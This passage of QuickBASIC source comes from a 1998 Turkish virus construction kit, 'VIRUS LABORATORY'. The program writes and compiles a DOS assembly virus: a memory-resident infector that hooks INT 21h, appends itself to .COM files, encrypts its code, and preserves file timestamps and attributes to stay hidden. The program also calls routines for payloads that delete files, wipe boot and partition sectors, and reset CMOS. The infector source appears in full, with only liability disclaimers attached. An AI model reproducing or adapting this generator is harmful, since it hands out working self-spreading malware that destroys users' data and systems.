  LOCATE Sat, Sut: PRINT Degisken$
  x = x - 1: IF x < 1 THEN x = 1
  LOCATE Sat, Sut + x - 1, 1
GOTO TusTextAl

Sol:
  x = x - 1: IF x < 1 THEN x = 1: SOUND 3500, .2
  LOCATE Sat, Sut + x - 1, 1
GOTO TusTextAl

Sag:
  x = x + 1: IF x > Boy THEN x = Boy: SOUND 3500, .2
  LOCATE Sat, Sut + x - 1, 1
GOTO TusTextAl

Tamam:
Degisken$ = RTRIM$(Degisken$)
LOCATE Sat, Sut, 0: COLOR TextRenk, ZeminRenk: PRINT Degisken$

END SUB

SUB TurkceFont
 FOR i = 1 TO 4096
 READ byte
 byte$ = CHR$(byte)
 MID$(CharSet$(0), i, 1) = byte$
 NEXT
 CALL LoadFont(CharSet$(), 256, 0)
END SUB

SUB TusYardim

LOCATE 1, 1, 0
PCOPY 0, 1
COLOR 15, zemin
LOCATE 6, 9: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ TUû YARDIMI ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
FOR i = 2 TO 14: COLOR 15, zemin: LOCATE 5 + i, 9: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(61, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
NEXT i
LOCATE 20, 9: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
COLOR 0, 0: LOCATE 21, 11: PRINT STRING$(63, "€")
COLOR 7, 0
LOCATE 20, 72: PRINT MID$(VirusMsg$, 67, 2)
LOCATE 21, 11: PRINT MID$(VirusMsgPrint$, 6, 63)

FOR ii = 3 TO 15
LOCATE ii + 4, 72: PRINT MID$(LTRIM$(RTRIM$(STR$(FuncCounter(ii)))), 2, 2)
NEXT

COLOR 15, zemin
LOCATE 6 + 1, 11: COLOR 15, zemin: PRINT "F1"; : COLOR 11, zemin: PRINT ":Ana yardçm ve aáçklama."
LOCATE 6 + 2, 11: COLOR 15, zemin: PRINT "F2"; : COLOR 11, zemin: PRINT ":Tuülar."
LOCATE 6 + 3, 11: COLOR 15, zemin: PRINT "F8"; : COLOR 11, zemin: PRINT ":VirÅsÅ oluüturma (VIRUS.ASM)."
LOCATE 6 + 4, 11: COLOR 15, zemin: PRINT "F10"; : COLOR 11, zemin: PRINT ":VirÅsÅ derleme (VIRUS.COM)."
LOCATE 6 + 5, 11: COLOR 15, zemin: PRINT "SPACE/ENTER"; : COLOR 11, zemin: PRINT ": Tetik iüaretleme."
LOCATE 6 + 6, 11: COLOR 15, zemin: PRINT "TAB"; : COLOR 11, zemin: PRINT ":Tarih/Saat/Sayaá bîlÅmÅne atlama."
LOCATE 6 + 7, 11: COLOR 15, zemin: PRINT "ESC"; : COLOR 11, zemin: PRINT ":Äçkçü."
LOCATE 6 + 8, 11: COLOR 15, zemin: PRINT "YUKARI OK"; : COLOR 11, zemin: PRINT ":Bir satçr yukarç (Yardçm bîlÅmÅnde)."
LOCATE 6 + 9, 11: COLOR 15, zemin: PRINT "AûA¶I OK"; : COLOR 11, zemin: PRINT ":Bir satçr aüaßç (Yardçm bîlÅmÅnde)."
LOCATE 6 + 10, 11: COLOR 15, zemin: PRINT "PAGE UP"; : COLOR 11, zemin: PRINT ":Bir sayfa yukarç (Yardçm bîlÅmÅnde)."
LOCATE 6 + 11, 11: COLOR 15, zemin: PRINT "PAGE DOWN"; : COLOR 11, zemin: PRINT ":Bir sayfa aüaßç (Yardçm bîlÅmÅnde)."
LOCATE 6 + 12, 11: COLOR 15, zemin: PRINT "HOME"; : COLOR 11, zemin: PRINT ":òlk satçr (Yardçm bîlÅmÅnde)."
LOCATE 6 + 13, 11: COLOR 15, zemin: PRINT "END"; : COLOR 11, zemin: PRINT ":Son satçr (Yardçm bîlÅmÅnde)."

oku:
k$ = INPUT$(1)
IF k$ <> ESC$ THEN GOTO oku

LOCATE 1, 1, 0
PCOPY 1, 0

END SUB

SUB VirusCom

TASMflag = 0: TLINKflag = 0: VIRUSflag = 0

OPEN "VIRUS.ASM" FOR BINARY AS #3
IF LOF(3) = 0 THEN VIRUSflag = 1: CLOSE #3: KILL "VIRUS.ASM"
CLOSE #3

OPEN "TASM.EXE" FOR BINARY AS #3
IF LOF(3) = 0 THEN TASMflag = 1: CLOSE #3: KILL "TASM.EXE"
CLOSE #3

OPEN "TLINK.EXE" FOR BINARY AS #3
IF LOF(3) = 0 THEN TLINKflag = 1: CLOSE #3: KILL "TLINK.EXE"
CLOSE #3

IF TASMflag <> 0 OR TLINKflag <> 0 OR VIRUSflag <> 0 THEN
 SOUND 3500, .1
 LOCATE 1, 1, 0
 PCOPY 0, 1
 satir = 9: sutun = 24
 COLOR 15, zemin
 LOCATE satir, sutun: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕ HATA ÕÕÕÕÕÕÕÕÕÕÕÕÕª"
 FOR i = 2 TO TASMflag + TLINKflag + VIRUSflag + 2: COLOR 15, zemin: LOCATE (satir - 1) + i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(31, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
 NEXT i
 LOCATE satir + TASMflag + TLINKflag + VIRUSflag + 2, sutun: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
 COLOR 0, 0: LOCATE satir + TASMflag + TLINKflag + VIRUSflag + 3, sutun + 2: PRINT STRING$(33, "€")
 COLOR 15, zemin

 IF VIRUSflag = 1 THEN LOCATE satir + 1, sutun + 2: COLOR 31, zemin: PRINT "VIRUS.ASM"; : COLOR 15, zemin: PRINT " bulunamadç !."
 IF TASMflag = 1 THEN LOCATE satir + 1 + VIRUSflag, sutun + 2: COLOR 31, zemin: PRINT "TASM.EXE"; : COLOR 15, zemin: PRINT " bulunamadç !."
 IF TLINKflag = 1 THEN LOCATE satir + 1 + TASMflag + VIRUSflag, sutun + 2: COLOR 31, zemin: PRINT "TLINK.EXE"; : COLOR 15, zemin: PRINT " bulunamadç !."
 LOCATE satir + TASMflag + TLINKflag + VIRUSflag + 1, sutun + 2, 1: COLOR 15, zemin: PRINT "Devam iáin bir tuüa basçn.";

 k$ = INPUT$(1)
 LOCATE 1, 1, 0
 PCOPY 1, 0
 GOTO ExitVirusCom
END IF

DosAktif = 1
HataDurumKodu = DosAktif
LOCATE 1, 1, 0
PCOPY 0, 1
COLOR 7, 0: CLS
PRINT "Virus Yazçlçyor"; : COLOR 23, 0: PRINT "..."
COLOR 7, 0
SHELL "TASM " + VirusFile$ + " " + VirusFileCom$ + ".OBJ"
PRINT "Virus Derleniyor"; : COLOR 23, 0: PRINT "..."
COLOR 7, 0
SHELL "TLINK /T " + VirusFileCom$ + ".OBJ"
CLS
COLOR 31, 0: PRINT "Virus Äalçümaya Hazçr."
k$ = INPUT$(1)
PCOPY 1, 0

ExitVirusCom:
HataDurumKodu = 0
END SUB

SUB VirusHazirla

FOR i = 1 TO 20
FuncTick(i) = FuncSign(i)
NEXT


OPEN VirusFile$ FOR OUTPUT AS #1

FOR i = 1 TO 3
IslemKodu = i
CALL Rapor(20, i): CALL VirusIskelet(IslemKodu)
CALL Rapor(1, i): CALL FuncDosyaSil(IslemKodu)
CALL Rapor(2, i): CALL FuncDosyaBoz(IslemKodu)
CALL Rapor(3, i): CALL FuncZamanDegistir(IslemKodu)
CALL Rapor(4, i): CALL FuncBootSil(IslemKodu)
CALL Rapor(5, i): CALL FuncBootDegistir(IslemKodu)
CALL Rapor(6, i): CALL FuncPartSil(IslemKodu)
CALL Rapor(7, i): CALL FuncCmosReset(IslemKodu)
CALL Rapor(8, i): CALL FuncKlavyeKilitle(IslemKodu)
CALL Rapor(9, i): CALL FuncSistemKilitle(IslemKodu)
CALL Rapor(10, i): CALL FuncColdReset(IslemKodu)
CALL Rapor(11, i): CALL FuncEkranaYaz(IslemKodu)
CALL Rapor(12, i): CALL FuncYaziciyaYaz(IslemKodu)
CALL Rapor(13, i): CALL FuncKlavyeLedleri(IslemKodu)
CALL Rapor(14, i): CALL FuncVideoModu(IslemKodu)
CALL Rapor(15, i): CALL FuncHarddiskYaz(IslemKodu)
NEXT
IslemKodu = 4
CALL Rapor(20, 4): CALL VirusIskelet(IslemKodu): CALL Rapor(0, 0)

END SUB

SUB VirusIskelet (IslemKodu)

IF IslemKodu = 1 THEN
PRINT #1, ";…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
PRINT #1, ";∫      Bu virus , 'VIRUS LABORATORY' programi tarafindan hazirlanmistir.   ∫"
PRINT #1, ";ÃÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕπ"
PRINT #1, ";∫      VIRUS LABORATORY programi SÅleyman GöNEL (eGo) tarafindan 1998 tari-∫"
PRINT #1, ";∫ hinde yazilmistir. Programin amaci istenen aktiviteleri gîsterebilecek   ∫"
PRINT #1, ";∫ bilgisayar virÅslerinin yazilmasi islemini otomatiklestirmektir.         ∫"
PRINT #1, ";ÃÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕπ"
PRINT #1, ";∫                                 UYARI !!!                                ∫"
PRINT #1, ";∫      Gerek 'VIRUS LABORATORY' programinin gerekse de bu program tarafin- ∫"
PRINT #1, ";∫ dan Åretilmis viruslerin sebep olabilecegi hiábir problem ve zarardan    ∫"
PRINT #1, ";∫ programin yazari - SÅleyman GöNEL - sorumlu tutulamaz. Bu programlarin   ∫"
PRINT #1, ";∫ kullanilmasi ile bu sart otomatik olarak kabul edilmis olmaktadir.       ∫"
PRINT #1, ";»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"
PRINT #1, ";"
PRINT #1, ";Versiyon.......: 1.50"
PRINT #1, ";Yazan..........: VIRUS LABORATORY (SÅleyman GöNEL (eGo))"
CALL GununZamani(GunTarih$, GunSaat$)
PRINT #1, ";Tarih..........: "; GunTarih$
PRINT #1, ";Saat...........: "; GunSaat$
PRINT #1, ";Genel..........: TSR + Bulasici (.COM) + Encrypt + Actions"
PRINT #1, ";Ek bilgi.......: COMMAND.COM ve WIN.COM dosyalarçna bulasmaz"
PRINT #1, ";"
PRINT #1, ";============================================================================"
PRINT #1, ".286"
PRINT #1, "cseg segment"
PRINT #1, "assume cs:cseg,ds:cseg,es:cseg"
PRINT #1, "org 100h"
PRINT #1, ";"
PRINT #1, ";=============================== ANA PROGRAM ================================"
PRINT #1, "Start: jmp Sifreli"
PRINT #1, "Imza:  db 'Çáåëñõ†•'"
PRINT #1, "Dosya: dw 0f0f0h"
PRINT #1, "Sifre: dw 0b0b0h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Sifreli:  cmp word ptr cs:[Sifre],0b0b0h"
PRINT #1, "          jz TSRmi"
PRINT #1, "          mov cx,offset Finish - Offset TSRmi"
PRINT #1, "          mov di,offset TSRmi"
PRINT #1, "KoduAc:   not byte ptr cs:[di]"
PRINT #1, "          inc di"
PRINT #1, "          loop KoduAc"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "TSRmi:    mov ax,7f7fh"
PRINT #1, "          int 21h"
PRINT #1, "          cmp ax,0f7f7h"
PRINT #1, "          jz Bellekte"
PRINT #1, "          mov ax,3521h"
PRINT #1, "          int 21h"
PRINT #1, "          mov word ptr cs:[int21],bx"
PRINT #1, "          mov word ptr cs:[int21+2],es"
PRINT #1, "          mov ax,2521h"
PRINT #1, "          mov dx,offset Virus"
PRINT #1, "          int 21h"
PRINT #1, "          mov dx,offset Finish"
PRINT #1, "          int 27h"
PRINT #1, "          mov ah,4ch"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Bellekte: mov ax,word ptr cs:[Dosya]"
PRINT #1, "          cmp ax,0f0f0h"
PRINT #1, "          jnz Dosyada"
PRINT #1, "Yanliz:   mov ah,4ch"
PRINT #1, "          int 21h"
PRINT #1, "Dosyada:  mov ax,offset Finish"
PRINT #1, "          add ax,word ptr cs:[OFS]"
PRINT #1, "          jmp ax"
PRINT #1, ";******************************* VIRUS KODU *********************************"
PRINT #1, "Virus:   "
END IF

IF IslemKodu = 2 THEN
PRINT #1, "Infection:cmp ah,4bh"
PRINT #1, "          je Bulas"
PRINT #1, "          cmp ax,7f7fh"
PRINT #1, "          jnz OrgInt21"
PRINT #1, "          mov ax,0f7f7h"
PRINT #1, "          iret"
PRINT #1, "OrgInt21: jmp dword ptr cs:[int21]"
PRINT #1, "          ret"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Bulas:    pushf"
PRINT #1, "          pusha"
PRINT #1, "          push ax"
PRINT #1, "          push bx"
PRINT #1, "          push cx"
PRINT #1, "          push dx"
PRINT #1, "          push si"
PRINT #1, "          push di"
PRINT #1, "          push bp"
PRINT #1, "          push es"
PRINT #1, "          push ds"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov bx,-1"
PRINT #1, "          mov cx,00ffh"
PRINT #1, "DosComs:  inc bx"
PRINT #1, "          push cx"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov si,dx"
PRINT #1, "          add si,bx"
PRINT #1, "          mov di,offset DosComspec"
PRINT #1, "          mov cx,0011"
PRINT #1, "          cld"
PRINT #1, "          rep cmpsb"
PRINT #1, "          jne DosComsE"
PRINT #1, "          jmp Comspec"
PRINT #1, "DosComsE: pop cx"
PRINT #1, "          loop DosComs"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov bx,-1"
PRINT #1, "          mov cx,00ffh"
PRINT #1, "WinComs:  inc bx"
PRINT #1, "          push cx"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov si,dx"
PRINT #1, "          add si,bx"
PRINT #1, "          mov di,offset WinComspec"
PRINT #1, "          mov cx,0007"
PRINT #1, "          cld"
PRINT #1, "          rep cmpsb"
PRINT #1, "          jne WinComsE"
PRINT #1, "Comspec:  pop cx"
PRINT #1, "          pop ds"
PRINT #1, "          pop es"
PRINT #1, "          pop bp"
PRINT #1, "          pop di"
PRINT #1, "          pop si"
PRINT #1, "          pop dx"
PRINT #1, "          pop cx"
PRINT #1, "          pop bx"
PRINT #1, "          pop ax"
PRINT #1, "          popa"
PRINT #1, "          popf"
PRINT #1, "          jmp OrgInt21"
PRINT #1, "WinComsE: pop cx"
PRINT #1, "          loop WinComs"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          pop ds"
PRINT #1, "          pop es"
PRINT #1, "          pop bp"
PRINT #1, "          pop di"
PRINT #1, "          pop si"
PRINT #1, "          pop dx"
PRINT #1, "          pop cx"
PRINT #1, "          pop bx"
PRINT #1, "          pop ax"
PRINT #1, "          popa"
PRINT #1, "          popf"
PRINT #1, "          pushf"
PRINT #1, "          pusha"
PRINT #1, "          push ax"
PRINT #1, "          push bx"
PRINT #1, "          push cx"
PRINT #1, "          push dx"
PRINT #1, "          push si"
PRINT #1, "          push di"
PRINT #1, "          push bp"
PRINT #1, "          push es"
PRINT #1, "          push ds"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov ax,3524h"
PRINT #1, "          int 21h"
PRINT #1, "          mov word ptr cs:[int24],bx"
PRINT #1, "          mov word ptr cs:[int24+2],es"
PRINT #1, "          mov ax,2524h"
PRINT #1, "          mov dx,offset Hata"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          pop ds"
PRINT #1, "          pop es"
PRINT #1, "          pop bp"
PRINT #1, "          pop di"
PRINT #1, "          pop si"
PRINT #1, "          pop dx"
PRINT #1, "          pop cx"
PRINT #1, "          pop bx"
PRINT #1, "          pop ax"
PRINT #1, "          popa"
PRINT #1, "          popf"
PRINT #1, "          pushf"
PRINT #1, "          pusha"
PRINT #1, "          push ax"
PRINT #1, "          push bx"
PRINT #1, "          push cx"
PRINT #1, "          push dx"
PRINT #1, "          push si"
PRINT #1, "          push di"
PRINT #1, "          push bp"
PRINT #1, "          push es"
PRINT #1, "          push ds"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "AttribAl: mov ax,4300h"
PRINT #1, "          int 21h"
PRINT #1, "          mov word ptr cs:[Attrib],cx"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ax,4301h"
PRINT #1, "          xor cx,cx"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "DosyaAc:  mov ax,3d02h"
PRINT #1, "          int 21h"
PRINT #1, "          mov word ptr cs:[Handle],ax"
PRINT #1, "          mov bx,ax"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "ZamanAl:  mov ax,5700h"
PRINT #1, "          int 21h"
PRINT #1, "          mov word ptr cs:[FileOrgTime],cx"
PRINT #1, "          mov word ptr cs:[FileOrgDate],dx"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "BoyuAl:   push cs"
PRINT #1, "          pop ds"
PRINT #1, "          mov ax,4202h"
PRINT #1, "          CALL Pointer"
PRINT #1, "          mov word ptr cs:[OFS],ax"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ax,4200h"
PRINT #1, "          CALL Pointer"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "VeriAl:   push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov ah,3fh"
PRINT #1, "          mov cx,000fh"
PRINT #1, "          mov dx,offset Veri"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov si,offset Veri"
PRINT #1, "          mov di,offset Tip"
PRINT #1, "          mov cx,2"
PRINT #1, "          cld"
PRINT #1, "          rep movsb"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          cmp word ptr cs:[Tip],05a4dh"
PRINT #1, "          jne Devam1"
PRINT #1, "          jmp Bulasma"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Devam1:   push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov si,offset Veri+3"
PRINT #1, "          mov di,offset Imza"
PRINT #1, "          mov cx,8"
PRINT #1, "          cld"
PRINT #1, "          rep cmpsb"
PRINT #1, "          jne Devam2"
PRINT #1, "          jmp Bulasma"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Devam2:   mov si,offset Veri+11"
PRINT #1, "          mov di,offset File"
PRINT #1, "          mov cx,2"
PRINT #1, "          cld"
PRINT #1, "          rep movsb"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "kopyala:  push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov si,offset Start"
PRINT #1, "          mov di,offset Finish + 100h"
PRINT #1, "          mov cx,offset Finish - offset Start"
PRINT #1, "          cld"
PRINT #1, "          rep movsb"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ax,4200h"
PRINT #1, "          CALL Pointer"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ah,3fh"
PRINT #1, "          mov cx,cs:[OFS]"
PRINT #1, "          mov dx,offset Finish + 100h + (offset Finish - offset Start)"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "CopyCopy: push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov si,offset Copy"
PRINT #1, "          mov di,offset Finish + 100h + (offset Finish - offset Start)"
PRINT #1, "          add di,cs:[OFS]"
PRINT #1, "          mov cx,offset Finish - offset Copy"
PRINT #1, "          cld"
PRINT #1, "          rep movsb"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov word ptr cs:[Offset Finish + 100h + (offset Dosya - Offset Start )],0f1f1h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov cx,offset Finish - Offset TSRmi"
PRINT #1, "          mov di,offset Finish + 100h + (offset TSRmi - offset Start)"
PRINT #1, "Kodla:    not byte ptr cs:[di]"
PRINT #1, "          inc di"
PRINT #1, "          loop Kodla"
PRINT #1, "          mov word ptr cs:[Offset Finish + 100h + (offset Sifre - Offset Start )],0b1b1h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "DosyaYaz: push cs"
PRINT #1, "          pop ds"
PRINT #1, "          mov ax,4200h"
PRINT #1, "          CALL Pointer"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ah,40h"
PRINT #1, "          mov bx,cs:[Handle]"
PRINT #1, "          mov cx,word ptr cs:[OFS]"
PRINT #1, "          add cx,offset Finish - offset Start"
PRINT #1, "          add cx,offset Finish - offset Copy"
PRINT #1, "          mov dx,offset Finish + 100h"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Bulasma:  mov ax,5701h"
PRINT #1, "          mov cx,word ptr cs:[FileOrgTime]"
PRINT #1, "          mov dx,word ptr cs:[FileOrgDate]"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ah,3eh"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          pop ds"
PRINT #1, "          pop es"
PRINT #1, "          pop bp"
PRINT #1, "          pop di"
PRINT #1, "          pop si"
PRINT #1, "          pop dx"
PRINT #1, "          pop cx"
PRINT #1, "          pop bx"
PRINT #1, "          pop ax"
PRINT #1, "          popa"
PRINT #1, "          popf"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          pusha"
PRINT #1, "          mov ax,4301h"
PRINT #1, "          mov cx,word ptr cs:[Attrib]"
PRINT #1, "          int 21h"
PRINT #1, "          popa"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          pushf"
PRINT #1, "          pusha"
PRINT #1, "          push ax"
PRINT #1, "          push bx"
PRINT #1, "          push cx"
PRINT #1, "          push dx"
PRINT #1, "          push si"
PRINT #1, "          push di"
PRINT #1, "          push bp"
PRINT #1, "          push es"
PRINT #1, "          push ds"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          mov ax,2524h"
PRINT #1, "          mov bx,offset int24 + 2"
PRINT #1, "          mov ds,bx"
PRINT #1, "          mov bx,offset int24"
PRINT #1, "          int 21h"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          pop ds"
PRINT #1, "          pop es"
PRINT #1, "          pop bp"
PRINT #1, "          pop di"
PRINT #1, "          pop si"
PRINT #1, "          pop dx"
PRINT #1, "          pop cx"
PRINT #1, "          pop bx"
PRINT #1, "          pop ax"
PRINT #1, "          popa"
PRINT #1, "          popf"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "          jmp OrgInt21"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Copy:     push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov si,offset Finish"
PRINT #1, "          mov di,100h"
PRINT #1, "          mov cx,word ptr cs:[OFS]"
PRINT #1, "          cld"
PRINT #1, "          rep movsb"
PRINT #1, "          mov ax,100h"
PRINT #1, "          jmp ax"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, " "
PRINT #1, ";++++++++++++++++++++++++++++++ Alt Yordamlar +++++++++++++++++++++++++++++++"
PRINT #1, "Pointer: xor cx,cx"
PRINT #1, "         xor dx,dx"
PRINT #1, "         int 21h"
PRINT #1, "         ret"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "Hata:    xor al,al"
PRINT #1, "         iret"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "HataSakla:push cs"
PRINT #1, "          pop ds"
PRINT #1, "          push cs"
PRINT #1, "          pop es"
PRINT #1, "          mov ax,3524h"
PRINT #1, "          int 21h"
PRINT #1, "          mov word ptr cs:[int24],bx"
PRINT #1, "          mov word ptr cs:[int24+2],es"
PRINT #1, "          mov ax,2524h"
PRINT #1, "          mov dx,offset Hata"
PRINT #1, "          int 21h"
PRINT #1, "          ret"
PRINT #1, ";----------------------------------------------------------------------------"
PRINT #1, "HataYaz:  mov ax,2524h"
PRINT #1, "          mov bx,offset int24 + 2"
PRINT #1, "          mov ds,bx"
PRINT #1, "          mov bx,offset int24"
PRINT #1, "          int 21h"
PRINT #1, "          ret"
PRINT #1, ";+++++++++++++++++++++++++++++++++ Aktiviteler ++++++++++++++++++++++++++++++"
PRINT #1, "Actions:"
END IF

IF IslemKodu = 3 THEN
PRINT #1, ";+++++++++++++++++++++++++++ Degiskenler & Veriler ++++++++++++++++++++++++++"
PRINT #1, "OFS    dw 0000"
PRINT #1, "Veri   db 00,00,'12345678',00,00,00,00,00,00"
PRINT #1, "int21  dd ?"
PRINT #1, "int24  dd ?"
PRINT #1, "Handle dw 0000"
PRINT #1, "Attrib dw 0000"
PRINT #1, "Tip    dw 0000"
PRINT #1, "Sign   db 0,0,0,0,0,0,0,0"
PRINT #1, "File   dw 0000"
PRINT #1, "Crypt  dw 0000"
PRINT #1, "DosComspec db 'COMMAND.COM'"
PRINT #1, "WinComspec db 'WIN.COM'"
PRINT #1, "FileOrgDate dw ?"
PRINT #1, "FileOrgTime dw ?"
PRINT #1, " "
END IF

IF IslemKodu = 4 THEN
PRINT #1, " "
PRINT #1, "Finish:"
PRINT #1, " "
PRINT #1, "cseg ends"
PRINT #1, "end Start"
CLOSE #1
END IF


END SUB

SUB Warning

satir = 3: sutun = 3
COLOR 0, zeminArka: CLS
COLOR 0, zemin: PRINT STRING$(80, " ")
COLOR 15, zemin: LOCATE 1, 32: PRINT program$
COLOR 11, zemin: LOCATE 1, 2: PRINT "VirÅs öretim Yazçlçmç"
LOCATE 1, 72: PRINT Yil$
LOCATE 1, 56: PRINT yazar$
COLOR LogoColor, zemin: LOCATE 1, 77: PRINT CHR$(250); CHR$(251); CHR$(252)
COLOR LogoColor, zeminArka: LOCATE 2, 77: PRINT CHR$(253); CHR$(254); CHR$(255)

COLOR 15, zemin
LOCATE satir, sutun: PRINT "…ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ ûARTNAME ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª"
FOR i = 2 TO 19: COLOR 15, zemin: LOCATE (satir - 1) + i, sutun: PRINT "∫"; : COLOR 3, zemin: PRINT STRING$(73, " "); : COLOR 15, zemin: PRINT "∫"; : COLOR 0, 0: PRINT "€€"
NEXT i
LOCATE satir + 19, sutun: COLOR 15, zemin: PRINT "»ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº"; : COLOR 0, 0: PRINT "€€"
COLOR 0, 0: LOCATE satir + 20, sutun + 2: PRINT STRING$(75, "€")
COLOR 15, zemin

LOCATE satir + 2, sutun + 2: PRINT "        Bu program Åretilirken olasç tÅm hatalara karüç test edilmiü ol-"
LOCATE satir + 3, sutun + 2: PRINT "masçna raßmen , gerek bu programçn gerekse bu program tarafçndan Åreti-"
LOCATE satir + 4, sutun + 2: PRINT "lecek viruslerin kullançmçndan doßabilecek hiábir problemden programçn "
LOCATE satir + 5, sutun + 2: PRINT "yazarç sorumlu tutulamaz."
LOCATE satir + 6, sutun + 2: PRINT "        Programçn kullançlmasç , bu üartçn otomatik olarak kabul edil-"
LOCATE satir + 7, sutun + 2: PRINT "mesi anlamçna gelmektedir."
LOCATE satir + 15, sutun + 2: PRINT "               YUKARIDAKò ûARTLARI KABUL EDòYORMUSUNUZ ?"
LOCATE satir + 17, sutun + 2: PRINT "                         ["; : COLOR 31, zemin: PRINT "E"; : COLOR 15, zemin: PRINT "vet]         ["; : COLOR 31, zemin: PRINT "H"; : COLOR 15, zemin: PRINT "ayçr]"
FOR kkk = 1 TO 50: k$ = INKEY$: NEXT kkk

TekrarTus:
k$ = INPUT$(1)
